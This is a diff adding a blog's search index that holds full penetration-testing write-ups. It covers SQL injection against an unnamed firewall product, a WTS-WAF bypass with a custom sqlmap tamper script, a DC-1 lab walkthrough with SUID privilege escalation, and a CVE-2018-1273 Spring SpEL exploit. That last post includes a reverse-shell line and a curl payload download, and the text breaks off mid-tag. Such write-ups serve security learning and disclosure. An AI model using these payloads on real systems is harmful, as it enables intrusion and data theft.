@@ -1,0 +1,294 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>Wordpress Plugin Simple Job Board 2.9.3 - 身份认证任意文件下载(Metasploit)</title>
+      <link href="2021/03/21/Wordpress-Plugin-Simple-Job-Board-2-9-3-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-Metasploit/"/>
+      <url>2021/03/21/Wordpress-Plugin-Simple-Job-Board-2-9-3-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-Metasploit/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> wordpress </tag>
+            
+            <tag> 任意文件下载 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sqlserver差异备份getshell</title>
+      <link href="2021/03/11/sqlserver%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/"/>
+      <url>2021/03/11/sqlserver%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/</url>
+      
+        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c9163ef62dfba3b62fc09391d77365258fe2512c340dccef5fd39d88f9004c3f">4630436162ade97ba2718b7d0c4b3b6351ade09e539dfebeb5402828e29e64b0afb3c4ed1f3b67ee946669089ea1a8d688237b6796a1b070eb3bf346509acdfb33822ce67975b5ceacf45cd5efef1f7b5a3fe70bfdefe41f5b795c2c5058b1eb37ed1a2aa4095d8b43648c7773301f16c1472f30f1f20b1bd24e45a4433fd60e8f9984c32c70de626a8bef1109d2cf1ee577010153eca1e47e23feba689085fafbedcfc0d7cc566272d8c8a5fb6792c12890fe3fdc3d82330a0b449c258fb422b777f550897a508faedb6fb0252106f60b408cd9889063e1705567f2a97a11b1f336e217c9c8306852a11c0c2630f38f646725631bbe5cad9f37ee115fa9fe719a336481161f721babb57e67f3fa17961417c29637ee9e81c67db50dc47407ea192c94a02dd6ab26c0ff76d7d9d59a9e04b4fe51761b1d0dee072f3e993377b87143b7b07aaeb85592450865f18988438681f8b55f0283d85c22ff3a2daa1aa92b669cb285a37e85246bd4d7895961fec3dd2a2837b9a9728539a492aedc6acedb0d429ae8e369e95a768048cebe3d85cb665d682bda1a5618d926b37592fb20153254fc7cdf05421d0d24fb6ba67e8e5d6d03c8e9d0b3101a40f46f6ec148ad7355fb09220a9d9450e040e32730310a1c823818faa20b2c7e26652317c46b56bef2d8a619085ef55bee2a0c90df03ff79ccb6687d1e4ac4438d0b12bff8323bf3c52dbd0580f0499cd2c6eb22c21f162bf79e049498d9314ff139ed3a89fae3c859af081e0070a68dc27ef15204eae101a82574bf5e754c0696c0d769ea6df6bd76a29f117d1f8af518c580cec86a51fdbdcd006f0dbf8c141682e025bf4d3ce836ee99096cae0926ffcaf7d3e03a3867f170af7380e0af1bacae17c7bf520ffb4db2a5d3b5d1f5fd043ebf1603e73843a2ddb65526092cdc76996d0abfcfa3d7ed302157d9566fff9ae7a463a71b066146ff9ef3fcb2b8d36e2755422c70c2f1eff259258c202b6550f3efec8760b7</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> getshell </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> sql注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CNVD证书</title>
+      <link href="2021/02/28/CNVD%E8%AF%81%E4%B9%A6/"/>
+      <url>2021/02/28/CNVD%E8%AF%81%E4%B9%A6/</url>
+      
+        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/03/13/YUO5skvjh41VQES.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 证书 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 证书 </tag>
+            
+            <tag> CNVD </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>靶机实战DC-4</title>
+      <link href="2021/02/13/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98DC-4/"/>
+      <url>2021/02/13/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98DC-4/</url>
+      
+        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1fd10544d79b7ce0f2fdff594f7b54c907c417ac119a8f5d412fe3edcf0a275b">4630436162ade97ba2718b7d0c4b3b63aa2ab1619d9cdbb4bb5fd57226dc61d2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      
+      
+      <categories>
+          
+          <category> 学习记录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶机 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>某防火墙系统SQL注入漏洞注入挖掘过程</title>
+      <link href="2021/02/06/%E6%9F%90%E9%98%B2%E7%81%AB%E5%A2%99SQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/"/>
+      <url>2021/02/06/%E6%9F%90%E9%98%B2%E7%81%AB%E5%A2%99SQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/</url>
+      
+        <content type="html"><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>今天下午在fofa上遇到一个某防火墙下的一个站，本来是想试着找找有没有通用的弱口令或者万能密码，最终失败告终</p><p>该防火墙系统登录页面如下</p><p><img src="https://i.loli.net/2021/02/07/RkIu5xEVJrYacsv.png"></p><p>看到这个登录页面，首先上bp爆破</p><p><img src="https://i.loli.net/2021/02/07/C8LUqJTP35HjvwA.png"></p><p>字典跑完了也没爆出来，常用的用户名换了几个也还是一样</p><p>看了一眼数据包</p><p><img src="https://i.loli.net/2021/02/07/T8lD1OzwfXHBFMr.png"></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>在username和password处尝试一下看看有没有注入点</p><p>果然还是仔细一点好，在username处报错了</p><p><img src="https://i.loli.net/2021/02/07/jwVem45WtRh9ZEl.png"></p><p>使用order by 判断字段，用#来闭合，最终 ‘ order by 5 #报错，’ order by 4 #返回正常</p><p><img src="https://i.loli.net/2021/02/07/c7apJHzMhgnPs8V.png"></p><p><img src="https://i.loli.net/2021/02/07/AXENxRKhcylagqM.png"></p><p>上sqlmap进行post注入</p><p>post注入时，可以使用 -r x.txt 的形式，另一种方式使用 –data=”xx=xxx”来进行注入</p><p>如果post请求的数据是这种形式的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参数1&#x3D;value1&amp;参数2&#x3D;value2&amp;参数3&#x3D;value3...</span><br></pre></td></tr></table></figure><p>这种形式使用-r来进行注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r x.txt</span><br></pre></td></tr></table></figure><p>若post请求的数据是下面这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;login.php HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxx</span><br><span class="line">Content-Length: 67</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Referer: xxxx</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: xxxx</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>这样的使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;&quot; --data&#x3D;&quot;&quot;</span><br></pre></td></tr></table></figure><p>这里我们使用 -r x.txt的形式</p><p><img src="https://i.loli.net/2021/02/07/jJdzkL9QC2nbmpc.png"></p><p>将保存的txt文件放在sqlmap目录下，如果保存在其他地方，注入时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r &quot;x.txt的绝对路径&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/07/v2yQZNfTBMYEScx.png"></p><p>可以看到确实存在漏洞</p><p>在fofa上可以查到许多相同产品的url，准备提交cnvd</p><p>但是在cnvd上查了一下，在两个月前被提交过了，可惜</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透记录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+            <tag> 渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>WTS-WAF绕过记录</title>
+      <link href="2021/01/23/WTS-WAF%E7%BB%95%E8%BF%87%E8%AE%B0%E5%BD%95/"/>
+      <url>2021/01/23/WTS-WAF%E7%BB%95%E8%BF%87%E8%AE%B0%E5%BD%95/</url>
+      
+        <content type="html"><![CDATA[<h2 id="WTS-WAF绕过"><a href="#WTS-WAF绕过" class="headerlink" title="WTS-WAF绕过"></a>WTS-WAF绕过</h2><p>某建站系统下的一些案例</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>拿到的站点简单的测试了一下，存在注入，但是部署了WAF</p><p><img src="https://i.loli.net/2021/02/14/iytAzL1gjol98mV.png"></p><p>可以看到WTS-WAF</p><p>在关键词中加入%可以绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;274 AN%D 1&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/tApi8rc7nb1SlUC.png"></p><p>没有拦截，说明可以绕过</p><p>尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;274 AN%D EXISTS(SELECT * FROM admin)</span><br></pre></td></tr></table></figure><p>被拦截</p><p><img src="https://i.loli.net/2021/02/14/3I5PeUAFHBYM1hQ.png"></p><p>在select和from中加入%</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;274 AN%D EXISTS(SEL%ECT * FR%OM admin)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/jfELcpM7OIlVgP4.png"></p><p>没有被拦，但是报错中可以看到select语法不对</p><p>可能SELECT没有过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;274 AN%D EXISTS(SELECT * FR%OM admin)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/XHzGE8rjnZD4C1w.png"></p><p>返回正常说明存在admin表</p><p>查询其他表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;274 AN%D EXISTS(SELECT * FR%OM users)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/Cl59s23iGEyIaQD.png"></p><p>说明不存在users表</p><h3 id="使用sqlmap进行注入"><a href="#使用sqlmap进行注入" class="headerlink" title="使用sqlmap进行注入"></a>使用sqlmap进行注入</h3><p><img src="https://i.loli.net/2021/02/14/cQIAat5BuDL7yZh.png"></p><p>有waf存在</p><p>参照sqlmap其他的tamper</p><p><img src="https://i.loli.net/2021/02/14/gdGR2lBVtWZL8qO.png"></p><p>编写tamper，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from lib.core.compat import xrange</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">        payload&#x3D;payload.replace(&#39;AND&#39;,&#39;AN%D&#39;)</span><br><span class="line">        payload&#x3D;payload.replace(&#39;ORDER&#39;,&#39;ORD%ER&#39;)</span><br><span class="line">        payload&#x3D;payload.replace(&#39;UNION&#39;,&#39;UNI%ON&#39;)</span><br><span class="line">        payload&#x3D;payload.replace(&quot;SLEEP&quot;,&quot;SLE%EP&quot;)</span><br><span class="line">        payload&#x3D;payload.replace(&#39;OR&#39;, &#39;O%R&#39;)</span><br><span class="line">        payload&#x3D;payload.replace(&#39;FROM&#39;, &#39;FR%OM&#39;)</span><br><span class="line">        return payload</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>保存到sqlmap目录下的tamper文件夹中</p><p>接着进行注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;xxx&quot; --batch --dbs --tamper&#x3D;WTS.py</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/kYtslqEAeBbLouw.png"></p><p>成功注入，可以看到是Access数据库，直接爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;xxx&quot; --batch --tables --tamper&#x3D;WTS.py</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/3YdJ8fO7b5szr69.png"></p><p>成功的爆出存在的表</p><p>在cnvd中查了一下没有被提交过</p><p>把其他案例收集一下打包好一起提交至cnvd，又是一例通用型漏洞</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透记录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> WAF </tag>
+            
+            <tag> tamper </tag>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>靶机实战DC-3</title>
+      <link href="2021/01/18/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98DC-3/"/>
+      <url>2021/01/18/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98DC-3/</url>
+      
+        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1fd10544d79b7ce0f2fdff594f7b54c907c417ac119a8f5d412fe3edcf0a275b">4630436162ade97ba2718b7d0c4b3b63aa2ab1619d9cdbb4bb5fd57226dc61d2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      
+      
+      <categories>
+          
+          <category> 学习记录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶机 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>靶机实战DC-1通关记录</title>
+      <link href="2021/01/09/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98DC-1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
+      <url>2021/01/09/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98DC-1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
+      
+        <content type="html"><![CDATA[<h1 id="靶机实战DC-1"><a href="#靶机实战DC-1" class="headerlink" title="靶机实战DC-1"></a>靶机实战DC-1</h1><h2 id="搭建靶机"><a href="#搭建靶机" class="headerlink" title="搭建靶机"></a>搭建靶机</h2><p>下载地址： <a href="https://www.five86.com/dc-1.html">https://www.five86.com/dc-1.html</a></p><p>搭建完成后，扫描得知靶机ip为 192.168.1.100</p><p>攻击机ip 192.168.1.101</p><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -A 192.168.1.100</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/XFPiKr1RlJTeYm5.png"></p><p>看到了开放的端口</p><p>访问80端口</p><p>看到是一个drupal 7 的CMS</p><p><img src="https://i.loli.net/2021/01/09/UyndR3mkl5w1pSI.png"></p><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>在msf中找Drupal的exp</p><p><img src="https://i.loli.net/2021/01/09/hTBMZ27Rl1gLr4U.png"></p><p>我这里用的 drupal_drupageddon</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ use exploit&#x2F;multi&#x2F;http&#x2F;drupal_drupageddon</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/XtVkbAH6wzTGRoZ.png"></p><p>查看需要配置的东西 show options</p><p><img src="https://i.loli.net/2021/01/09/w2Gx5gFibHuVmoI.png"></p><p>将rhosts设置为192.168.1.100</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ set rhosts 192.168.1.100</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/WZF4hStPULyviu1.png"></p><p>run或exploit开始利用</p><p><img src="https://i.loli.net/2021/01/09/vPLi9lDwQYH8c2h.png"></p><p>成功，查看目录，发现有flag1.txt</p><p>cat flag1.txt 查看</p><p><img src="https://i.loli.net/2021/01/09/H8FpSdLDjQOhCoA.png"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>根据提示flag1给出的提示，flag2在配置文件中</p><p>查询阅读<a href="http://drupalchina.cn/node/1402">http://drupalchina.cn/node/1402</a>得知配置文件在sites/default/settings.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat site&#x2F;default&#x2F;settings.php</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/ytC26LmExzgf3bk.png"></p><p>成功拿到flag2，同时我们拿到数据库名和密码</p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>接下来进入交互式shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ shell</span><br><span class="line">$ python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/H7GqOkJr4dzveSa.png"></p><p>使用刚才获得的数据库名和密码登录数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/7nGliu21YNrgq8J.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use drupaldb</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/qnJshL3UtZED5G4.png"></p><p>查看表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/DBECtiVcgoZLlTO.png"></p><p>发现一个user表</p><p>查看user中的用户和登录密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/tyUZpJX8xo5zgFl.png"></p><p>发现密码经过了加密，这里应该是drupal自己的加密方式，正面破解应该不太现实</p><p>在drupal的官网翻到了重置密码的方式<a href="https://www.drupal.org/node/1023428">https://www.drupal.org/node/1023428</a></p><p><img src="https://i.loli.net/2021/01/09/ZJ3C4Tg2pvHUeEx.png"></p><p>所以我们在Drupal的根目录下执行,先利用加密的文件进行加密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;scripts&#x2F;password-hash.sh 111111</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/jc46m2EIPWZUYM8.png"></p><p>于是我们得到了111111经过加密的哈希值</p><p>接下来，我们要进入数据库中将admin的密码替换成我们111111的哈希值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; update users set pass &#x3D;&#39;$S$Dw6S3D8t1.uftA6S3D8t1.uftA6lXTmqFjisawSh0X0o0pdIh7Uy1Q6MvxVOJNiT&#39; WHERE name&#x3D;&#39;admin&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/jybZuIOm2RMB18W.png"></p><p>再看一下我们的users表</p><p><img src="https://i.loli.net/2021/01/09/nQ5b3PmL8RTD9NM.png"></p><p>admin的密码已经改成111111的哈希值</p><p>然后我们访问80端口使用admin和111111登录</p><p>登录成功</p><p><img src="https://i.loli.net/2021/01/09/wK15NWc6vzZuyqf.png"></p><p>在content中找到flag3</p><p><img src="https://i.loli.net/2021/01/09/RKmBTesSwnPvOr5.png"></p><p><img src="https://i.loli.net/2021/01/09/4CxXIuOM621lsZD.png"></p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>根据flag3给的提示，查看他的passwd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/jeSQX3AIVYmUFOs.png"></p><p>看到在/home目录下存在flag4，最终在/home/flag4下查看到存在flag4.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;home&#x2F;flag4&#x2F;flag4.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/e3r29p6Z8hGAXdL.png"></p><h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>根据flag4给的提示，我们接下来可能需要在root权限下进行</p><p>whoami查看当前的权限，cd /root目录下发现权限不够</p><p><img src="https://i.loli.net/2021/01/09/utG8KSxHYPWFwIa.png"></p><p>这里使用SUID命令提权，SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限</p><p>使用以下命令可以发现系统上运行的所有SUID可执行文件，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/EOputeSsT5Zyj1U.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ find . exec &#39;&#x2F;bin&#x2F;sh&#39; \;</span><br><span class="line">$ whoami</span><br></pre></td></tr></table></figure><p>成功变成root权限</p><p><img src="https://i.loli.net/2021/01/09/LKa8isMnUpRukYN.png"></p><p>cd /root 成功找到thefinalflag.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># cat thefinalflag.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/L4q7Q35uJXCPtcT.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 学习记录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶机 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Spring Data Commons 远程命令执行漏洞利用</title>
+      <link href="2020/12/29/Spring-Data-Commons-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+      <url>2020/12/29/Spring-Data-Commons-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Spring-Data-Commons-远程命令执行漏洞（CVE-2018-1273）"><a href="#Spring-Data-Commons-远程命令执行漏洞（CVE-2018-1273）" class="headerlink" title="Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）"></a>Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</h1><p>Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><p>访问192.168.1.106:8080/users页面</p><img src="https://i.loli.net/2021/01/02/IHLqF5aNEt3Uz7y.png" width="60%" hight="60%" /><p>是一个注册页面，bp抓包修改数据包</p><p>在/tmp目录下创建success</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ username[<span class="comment">#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch /tmp/success&quot;)]=&amp;password=&amp;repeatedPassword=</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/02/cDWktvfITKNE5sC.png"></p><p>发现成功在tmp文件下创建success</p><p><img src="https://i.loli.net/2021/01/02/OJspcl3CZbtwvjT.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>创建一个文件bash.sh写入反弹shell的语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/192.168.1.102/5555 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>将bash.sh放在root目录下</p><p>在此目录下开启一个http服务，来下载文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m http.server 9999</span><br></pre></td></tr></table></figure><p>访问一下，可以ok</p><img src="https://i.loli.net/2021/01/02/fpeklUr9y72wINs.png" width="60%" hight="60%" /><p>改一下payload中的命令，使用curl -o 指定路径将bash.sh下载到靶机中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ username[<span class="comment">#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;curl -o /tmp/bash.sh http://192.168.1.105:9999/bash.sh&quot;)]=&amp;password=&amp;repeatedPassword=</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/02/nmL7F1tZyfMlJih.png"></p><p>成功下载</p><p><img 